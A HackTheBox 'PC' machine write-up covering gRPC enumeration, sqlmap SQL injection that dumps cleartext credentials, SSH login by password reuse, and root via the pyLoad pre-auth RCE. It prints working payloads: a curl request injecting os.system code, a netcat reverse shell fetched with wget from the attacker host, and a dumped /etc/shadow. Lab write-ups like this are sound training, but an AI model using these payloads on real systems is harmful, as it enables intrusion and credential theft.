---
title: "HTB - PC"
date: 2023-06-20T15:08:39+09:30
draft: false
---

[//]: # (Project: HTB Machine Writeups - Generated with Python3)  
[//]: # (Title: HTB PC Writeup)  
[//]: # (Author: M4773L)  
[//]: # (Date: 16/06/2023 - 08:19 PM)  
[//]: # (Date_Modified: ) 
[//]: # (WEBSITE_URL: http://m4773l.github.io)
[//]: # (GITHUB_REPO_URL: https://github.com/M4773L)

# PC
 
PC is an easy rated machine on the HackTheBox platform, the journey to pwning this box will see us interacting with an interesting service where we can obtain credentials via SQL injection. Privilege escalation from user to root is relatively straightforward with a HTTP service listening locally on the target which is vulnerable to remote code execution.  
<!--more-->  

![Machine Info Card](/blog/htb/machines/pc/img/pc.png)  
&nbsp;  

## Enumeration
**Target IP: 10.10.11.214**

#### Nmap

**TCP - Aggressive**  
```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ nmap -A -Pn 10.10.11.214
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-13 08:06 ACST
Nmap scan report for 10.10.11.214
Host is up (0.035s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.14 seconds
```
An 'aggressive' Nmap scan of the host returns only port 22 (SSH) as open.  
&nbsp;  

**TCP - All Ports**  
```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ nmap -sTV -p- -Pn 10.10.11.214 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-13 08:07 ACST
Nmap scan report for 10.10.11.214
Host is up (0.037s latency).
Not shown: 65533 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
....
SNIP
....
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.92 seconds
```
A TCP connect scan across the whole range of TCP ports returns an unknown service listening on port 50051 in addition to port 22.
&nbsp;

**UDP**  
```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ sudo nmap -sUV -Pn --top-ports 1000 10.10.11.214
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-13 08:06 ACST
Nmap scan report for 10.10.11.214
Host is up.
All 1000 scanned ports on 10.10.11.214 are open|filtered

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5239.68 seconds

```  
A scan of the top 1000 UDP ports reveals there isn't much communication happening via user-datagram protocol.  
&nbsp;  

**Port 50051**  
Googling for what service could be listening on port 50051 returns a variety of potential candidates, hopefully attempting to connect with Netcat provides a better clue.  

```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ nc -v 10.10.11.214 50051          
10.10.11.214: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.11.214] 50051 (?) open
▒?��?�� ?@Did not receive HTTP/2 settings before handshake timeout 
```
After connecting to the target port with Netcat we are greeted with some Unicode chartacters before the connection times out and we receive an error stating: "Did not receive HTTP/2 settings before handshake timeout"  

Searching on Google for this error returns several results for a service named Google Remote Procedural Call (GRPC).  
&nbsp;  

#### Google Remote Procedural Call (GRPC)
GRPC is marketed as cross-platform, open source, high performance remote procedural call framework that was originally created by Google. The framework uses HTTP/2 for connectivity and provides support for multiple programming languages. 

**What is RPC**  
A remote procedural call commonly abbreviated as RPC is a method used for executing functions from an application on a remote computer. RPC uses a client / server model where the request is performed by the client and the server is where the target application functions are called and the response(s) are sent back to the requesting client.  

For more information on Remote Procedural Calls:  
[Remote Procedural Calls - TechTarget](https://www.techtarget.com/searchapparchitecture/definition/Remote-Procedure-Call-RPC)  

To interact with GRPC we have a few options:  
* [GRPCurl](https://github.com/fullstorydev/grpcurl) - As the name states this is a command line utility for interacting with GRPC services.  
* [GRPCUi](https://github.com/fullstorydev/grpcui) - A web browser user interface for interacting with GRPC services.   

For this challenge I will be using GRPCUi with Burpsuite to proxy requests.  
&nbsp;  

**GRPCUI**  
```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ grpcui --plaintext 10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:40661/
```
When connecting to the target service we use the ```--plaintext``` flag to specify we are connecting to a server without SSL. Once connected we can navigate to the URL in a web browser to access the user interface.  
&nbsp;

![Burpsuite Scope](/blog/htb/machines/pc/img/burpsuite_scope.jpg)  
Add the URL of the Web user interface to the target scope in Burpsuite.  

![Simple App 1](/blog/htb/machines/pc/img/grpc_webui_1.jpg)  
Navigating to the UI in Firefox browser and you can see we are connected to the target server. Under the service name you can see we are connected to 'SimpleApp' and we have 3 methods we can choose from.  
&nbsp;  

**Register User**  
![Register User](/blog/htb/machines/pc/img/register_user.jpg)  
Supply a username and password and click 'invoke' to send the data to the application on the target host.  

![Register User Response](/blog/htb/machines/pc/img/register_user_2.jpg)  
Taking a look at the response and there is a message stating the account was created successfully.   
&nbsp;  

**Login User**  
![Login User](/blog/htb/machines/pc/img/login_user.jpg)  
Moving onto the Login user method, supplying the application with the same username and password for the account we created in the last step before clicking 'invoke'.  

![Login User Response](/blog/htb/machines/pc/img/login_user_2.jpg)
Results in a message with an user ID number and a token. 
&nbsp;  

**Get Info**  
![Get Info](/blog/htb/machines/pc/img/get_info.jpg)  
Making a call to the 'getinfo' function using the ID and token we received from the previous call to the login function.  

![Get Info Response](/blog/htb/machines/pc/img/get_info_2.jpg)  
In the response we recieve a message stating: "Will update soon.", this doesn't provide us with much information.  

![Get Info Injection](/blog/htb/machines/pc/img/get_info_3.jpg)  
Lets try and make another call and include a single quote in the ID field.  

![Get Info Response](/blog/htb/machines/pc/img/get_info_4.jpg) 
We recieve a 'TypeError' for a bad argument for a built-in operation, this indicates that the function could be vulnerable to SQL injection.  
&nbsp;  

## Foothold
#### Testing SQLi  
![Save Burp Request](/blog/htb/machines/pc/img/burp_copy_request.jpg)  
To proceed I will need to save a copy of the POST request to the 'getinfo' function to a file that will be used by SQLMap to test for injection. Right-click on the request and select 'Copy to file'.  

![Save Burp Request](/blog/htb/machines/pc/img/burp_copy_request_2.jpg) 
Navigate to a directory of your choice and name the file accordingly.  
&nbsp;  

**Modify Request**  
```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ vim request.txt
```
Open the request in your text editor of choice.  

```
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:33493
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-grpcui-csrf-token: sgBYY3Tog-byrLjObZpTjuXu_4ONy1qDclpWU3kfaxg
X-Requested-With: XMLHttpRequest
Content-Length: 193
Origin: http://127.0.0.1:33493
Connection: close
Referer: http://127.0.0.1:33493/
Cookie: _grpcui_csrf_token=sgBYY3Tog-byrLjObZpTjuXu_4ONy1qDclpWU3kfaxg
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTQ3NyIsImV4cCI6MTY4NjYyNzUyOX0.wVgbdMKg8T4CsE8qAMqSFnOUIy0K9rwg0sPjSO2LT7g"}],"data":[{"id":"488*"}]}
```
In the 'id' field add an asterisk to the value, this allows SQLMap to identify the suspected vulnerable injection point.  
&nbsp;  

**SQLMap**  
```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ sqlmap -r request.txt --batch --risk 3       
       __H__                                                                                                                               
 ___ ___[,]_____ ___ ___{1.7.6.3#dev}                                                                                                
|_ -| . [.]     | .'| . |                                                                                                                  
|___|_  ["]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:44:48 /2023-06-13/

[10:44:48] [INFO] parsing HTTP request from 'request.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[10:44:48] [INFO] testing connection to the target URL
[10:44:48] [INFO] testing if the target URL content is stable
[10:44:49] [INFO] target URL content is stable
[10:44:49] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic
[10:44:49] [WARNING] (custom) POST parameter 'JSON #1*' does not appear to be dynamic
[10:44:49] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable
[10:44:49] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
[10:44:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:44:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[10:44:50] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
[10:44:52] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (1) value? [Y/n] Y
[10:44:52] [INFO] testing 'Generic inline queries'
[10:44:52] [INFO] testing 'SQLite inline queries'
[10:44:52] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[10:44:52] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[10:44:52] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[10:44:52] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
[10:45:05] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'SQLite > 2.0 OR time-based blind (heavy query)' injectable 
[10:45:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:45:05] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:45:06] [INFO] target URL appears to be UNION injectable with 1 columns
[10:45:06] [INFO] (custom) POST parameter 'JSON #1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[10:45:06] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTQ3NyIsImV4cCI6MTY4NjYyNzUyOX0.wVgbdMKg8T4CsE8qAMqSFnOUIy0K9rwg0sPjSO2LT7g"}],"data":[{"id":"-1425 OR 9629=9629"}]}

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTQ3NyIsImV4cCI6MTY4NjYyNzUyOX0.wVgbdMKg8T4CsE8qAMqSFnOUIy0K9rwg0sPjSO2LT7g"}],"data":[{"id":"488 OR 4805=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))"}]}

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTQ3NyIsImV4cCI6MTY4NjYyNzUyOX0.wVgbdMKg8T4CsE8qAMqSFnOUIy0K9rwg0sPjSO2LT7g"}],"data":[{"id":"488 UNION ALL SELECT CHAR(113,118,106,118,113)||CHAR(102,103,88,105,80,83,65,89,68,87,107,70,78,107,89,81,74,118,78,111,105,117,78,97,106,97,84,73,84,113,69,106,111,116,85,74,112,111,70,103)||CHAR(113,120,118,113,113)-- ashJ"}]}
---
[10:45:06] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[10:45:06] [INFO] fetched data logged to text files under '/home/matt/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 10:45:06 /2023-06-13/

```
Executing SQLMap with the '-r' flag followed by the saved POST request file specifies we will be using the request file. In the results we can see that "(custom) POST parameter 'JSON #1*' is vulnerable." meaning we can proceed to dump the tables from the database.  
 
```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ sqlmap -r request.txt --batch --risk 3 --dump
       __H__                                                                                                                               
 ___ ___[,]_____ ___ ___{1.7.6.3#dev}                                                                                                
|_ -| . [.]     | .'| . |                                                                                                                  
|___|_  ["]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:46:11 /2023-06-13/

[10:46:11] [INFO] parsing HTTP request from 'request.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[10:46:12] [INFO] resuming back-end DBMS 'sqlite' 
[10:46:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTQ3NyIsImV4cCI6MTY4NjYyNzUyOX0.wVgbdMKg8T4CsE8qAMqSFnOUIy0K9rwg0sPjSO2LT7g"}],"data":[{"id":"-1425 OR 9629=9629"}]}

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTQ3NyIsImV4cCI6MTY4NjYyNzUyOX0.wVgbdMKg8T4CsE8qAMqSFnOUIy0K9rwg0sPjSO2LT7g"}],"data":[{"id":"488 OR 4805=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))"}]}

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTQ3NyIsImV4cCI6MTY4NjYyNzUyOX0.wVgbdMKg8T4CsE8qAMqSFnOUIy0K9rwg0sPjSO2LT7g"}],"data":[{"id":"488 UNION ALL SELECT CHAR(113,118,106,118,113)||CHAR(102,103,88,105,80,83,65,89,68,87,107,70,78,107,89,81,74,118,78,111,105,117,78,97,106,97,84,73,84,113,69,106,111,116,85,74,112,111,70,103)||CHAR(113,120,118,113,113)-- ashJ"}]}
---
[10:46:12] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[10:46:12] [INFO] fetching tables for database: 'SQLite_masterdb'
[10:46:12] [INFO] fetching columns for table 'messages' 
[10:46:12] [INFO] fetching entries for table 'messages'
Database: <current>
Table: messages
[1 entry]
+----+----------------------------------------------+----------+
| id | message                                      | username |
+----+----------------------------------------------+----------+
| 1  | The admin is working hard to fix the issues. | admin    |
+----+----------------------------------------------+----------+

[10:46:12] [INFO] table 'SQLite_masterdb.messages' dumped to CSV file '/home/matt/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/messages.csv'
[10:46:12] [INFO] fetching columns for table 'accounts' 
[10:46:12] [INFO] fetching entries for table 'accounts'
Database: <current>
Table: accounts
[2 entries]
+----------+------------------------+
| username | password               |
+----------+------------------------+
| admin    | admin                  |
| sau      | HereIsYourPassWord1431 |
+----------+------------------------+

[10:46:12] [INFO] table 'SQLite_masterdb.accounts' dumped to CSV file '/home/matt/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/accounts.csv'
[10:46:12] [INFO] fetched data logged to text files under '/home/matt/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 10:46:12 /2023-06-13/

```
Running the same command with the '--dump' flag retrieves the tables from the database. You can see we dumped 2 tables: messages and accounts which contains usernames and clear-text passwords.  
&nbsp;  

## Privilege Escalation - User

#### Testing Password Reusage
```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ ssh sau@10.10.11.214                       
sau@10.10.11.214's password: 
Last login: Mon May 15 09:00:44 2023 from 10.10.14.19
sau@pc:~$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau)
sau@pc:~$ pwd
/home/sau
sau@pc:~$ ls
user.txt

```
Testing if we can SSH into the target using credentials from the dumped 'accounts' table and we are successful as user 'sau'.  

&nbsp;  

## Privilege Escalation - Root

```
sau@pc:~$ sudo -l
[sudo] password for sau: 
Sorry, user sau may not run sudo on localhost.
sau@pc:~$ crontab -l
no crontab for sau

```  
Checking if there are any commands we can run as 'sudo' or crontabs for the current user proves unfruitful.  

```
sau@pc:~$ netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
```
Taking a look at active connections on the target and there is a service listening locally on port 8000.  
&nbsp;  

#### Port 8000
```
sau@pc:~$ curl http://127.0.0.1:8000/
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F">/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F</a>. If not, click the link.
```
Performing a GET request using Curl on the target, we receive a redirect, we will need to forward the port to access the site from a web browser.  
&nbsp;  

**SSH with Port Forwading**  
```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214
sau@10.10.11.214's password: 
Last login: Tue Jun 13 01:17:35 2023 from 10.10.14.20
```
SSH into the target again this time with the '-L' flag, the syntax for port-forwarding is: ```-L <Local Port>:<Target IP>:<Target Port>```.  
&nbsp;  

![Pyload Login](/blog/htb/machines/pc/img/pyload_login.jpg)  
Navigating to the port forwarded service in Firefox web browser, redirects us to a login page for Pyload.  

```
sau@pc:~$ ps -aux 
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.2  0.2 168148 11416 ?        Ss   00:45   0:06 /sbin/init
root           2  0.0  0.0      0     0 ?        S    00:45   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   00:45   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   00:45   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   00:45   0:00 [kworker/0:0H-kblockd]
root           8  0.0  0.0      0     0 ?        I<   00:45   0:00 [mm_percpu_wq]
root           9  0.0  0.0      0     0 ?        S    00:45   0:00 [ksoftirqd/0]
root          10  0.0  0.0      0     0 ?        I    00:45   0:01 [rcu_sched]
....
SNIP
....
systemd+    1020  0.0  0.3  24448 12160 ?        Ss   00:45   0:00 /lib/systemd/systemd-resolved
root        1059  0.6  0.7 634668 30788 ?        Ssl  00:45   0:15 /usr/bin/python3 /opt/app/app.py
root        1064  0.1  1.5 1216804 61360 ?       Ssl  00:45   0:04 /usr/bin/python3 /usr/local/bin/pyload
root        1077  0.0  0.0   8540  2968 ?        Ss   00:45   0:00 /usr/sbin/cron -f
....
SNIP
....
```
On the target we can see that PyLoad is running as the root user.  

#### POC
A quick Google search for 'Pyload Vulnerabilities' reveals a Pre-Auth Remote Code Execution vulnerability from January 2023.  
![Proof of Concept](/blog/htb/machines/pc/img/github_poc.jpg)
[PyLoad Proof-of-Concept - GitHub](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)  
&nbsp;  

**Explanation**  
The vulnerability exists where an unsanitised user supplied string is passed to js2py's 'eval_js()' function which can lead to arbitrary code execution. 
The Js2Py package allows for a Python application to execute Javascript by translating the supplied Javascript into Python code, this removes the requirement of installing a large Javascript engine. By default js2py allows for importing Python packages by prefixing "pyimport" to the supplied string which for example, allows us to import the os package and execute system commands.  
&nbsp;  

**Testing**  
```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ curl -i -s -k -X $'POST' \                                                                                                                                                                                                           6 ⨯
    --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwnd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 21
Access-Control-Max-Age: 1800
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: OPTIONS, GET, POST
Vary: Accept-Encoding
Date: Tue, 13 Jun 2023 01:30:46 GMT
Server: Cheroot/8.6.0

Could not decrypt key
```
Testing the proof of concept exploit, if successuful we will see an empty file named 'pwnd' with root permissions created in the '/tmp' directory on the target.  

```
sau@pc:~$ ls -la /tmp
total 60
drwxrwxrwt 15 root root 4096 Jun 13 01:30 .
drwxr-xr-x 21 root root 4096 Apr 27 15:23 ..
drwxrwxrwt  2 root root 4096 Jun 13 00:45 .ICE-unix
drwxrwxrwt  2 root root 4096 Jun 13 00:45 .Test-unix
drwxrwxrwt  2 root root 4096 Jun 13 00:45 .X11-unix
drwxrwxrwt  2 root root 4096 Jun 13 00:45 .XIM-unix
drwxrwxrwt  2 root root 4096 Jun 13 00:45 .font-unix
-rw-r--r--  1 root root    0 Jun 13 01:30 pwnd
drwxr-xr-x  4 root root 4096 Jun 13 00:45 pyLoad
....
SNIP
....
```
As you can see the file named 'pwnd' was successuflly created in the '/tmp' directory on the target.  

**Reverse Shell**  
```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ vim rev.sh
```
Using Vim I will create a file containing a reverse shell.  

```
#!/bin/bash

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 4242 >/tmp/f
```
The reverse shell from [*Payloads All The Things*](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-busybox) with my HackTheBox VPN IP address and chosen port.  

```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ python3 -m http.server 8010                                                                          
Serving HTTP on 0.0.0.0 port 8010 (http://0.0.0.0:8010/) ...
10.10.11.214 - - [13/Jun/2023 11:07:42] "GET /rev.sh HTTP/1.1" 200 -

````
Host the file containing the reverse shell with a simple Python HTTP server.  

```
sau@pc:~$ cd /tmp
sau@pc:/tmp$ wget http://10.10.14.20:8010/rev.sh
--2023-06-13 01:37:11--  http://10.10.14.20:8010/rev.sh
Connecting to 10.10.14.20:8010... connected.
HTTP request sent, awaiting response... 200 OK
Length: 95 [text/x-sh]
Saving to: ‘rev.sh’

rev.sh                                                      100%[========================================================================================================================================>]      95  --.-KB/s    in 0s      

2023-06-13 01:37:11 (3.08 MB/s) - ‘rev.sh’ saved [95/95]

sau@pc:/tmp$ chmod +x rev.sh

```
Download the file from the HTTP server to the target host using Wget, then give the file executable permissions.  

```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ nc -lvnp 4242
listening on [any] 4242 ...
```
Start a Netcat listener on the port where the reverse shell will connect to.  

```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ curl -i -s -k -X $'POST' \ 
    --data-binary $'jk=pyimport%20os;os.system(\"/tmp/rev.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \                                                     
    $'http://127.0.0.1:8000/flash/addcrypted2

    .... HANG....
```
Now lets execute the reverse shell using the exploit, the command will appear to hang.  

```
┌──(matt㉿HackTheBoxKali)-[~/Pc]
└─$ nc -lvnp 4242                 
listening on [any] 4242 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.214] 52412
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/root/.pyload/data

```
Back at our Netcat listener we receive a connection from the target, running the 'id' command and you can see we are the root user.  

&nbsp;  

## Root

```
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@pc:~/.pyload/data# cd /root
cd /root
root@pc:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@pc:~# ls -la
ls -la
total 68
drwx------  7 root root  4096 Apr 27 15:32 .
drwxr-xr-x 21 root root  4096 Apr 27 15:23 ..
lrwxrwxrwx  1 root root     9 Jan 11 17:36 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root  4096 Apr  4 10:25 .cache
drwxr-xr-x  3 root root  4096 Apr  4 10:25 .local
-rw-r--r--  1 root root   161 Dec  5  2019 .profile
drwxr-xr-x  7 root root  4096 Jan 11 17:21 .pyload
-rw-------  1 root root  3203 Apr 27 15:32 .viminfo
drwxr-xr-x  3 root root  4096 Apr 27 13:15 Downloads
-rw-r-----  1 root root    33 Jun 13 00:46 root.txt
drwx------  3 root root  4096 Jan 11 16:56 snap
-rw-r--r--  1 root root 24576 Jan 11 17:57 sqlite.db.bak

```  
Here I have updgraded the shell to give us a better prompt, changed to the root directory, checked the user id and have listed out the contents of the root directory.  

```
root@pc:~# cat /etc/shadow
cat /etc/shadow
root:$6$DyP1KfBYGKoKi9P1$UiRaoILBpT81btxBn3Hzd5KmsRiijiMcR8J/F7ULWYvIMVzicsE3s/Yfyd20bypQUJ4utbJMRzYip4HT0s9ri.:19368:0:99999:7:::
daemon:*:19367:0:99999:7:::
bin:*:19367:0:99999:7:::
sys:*:19367:0:99999:7:::
sync:*:19367:0:99999:7:::
games:*:19367:0:99999:7:::
man:*:19367:0:99999:7:::
lp:*:19367:0:99999:7:::
mail:*:19367:0:99999:7:::
news:*:19367:0:99999:7:::
uucp:*:19367:0:99999:7:::
proxy:*:19367:0:99999:7:::
www-data:*:19367:0:99999:7:::
backup:*:19367:0:99999:7:::
list:*:19367:0:99999:7:::
irc:*:19367:0:99999:7:::
gnats:*:19367:0:99999:7:::
nobody:*:19367:0:99999:7:::
systemd-network:*:19367:0:99999:7:::
systemd-resolve:*:19367:0:99999:7:::
systemd-timesync:*:19367:0:99999:7:::
messagebus:*:19367:0:99999:7:::
syslog:*:19367:0:99999:7:::
_apt:*:19367:0:99999:7:::
tss:*:19367:0:99999:7:::
uuidd:*:19367:0:99999:7:::
tcpdump:*:19367:0:99999:7:::
sshd:*:19367:0:99999:7:::
landscape:*:19367:0:99999:7:::
pollinate:*:19367:0:99999:7:::
fwupd-refresh:*:19367:0:99999:7:::
systemd-coredump:!!:19368::::::
lxd:!:19368::::::
sau:$6$Gx2uZX1oO0Qx6c3z$DUQFBRdrpJRsMo098RVb/o.QDhL.n9aKWRdjNrrn6VU4fnBkuhBOnjPz.Oiua5ZswZMrVn3UwfSje/fUWkJYv.:19368:0:99999:7:::
_laurel:!:19474::::::

```
The '/etc/shadow' file from the target.  

&nbsp;

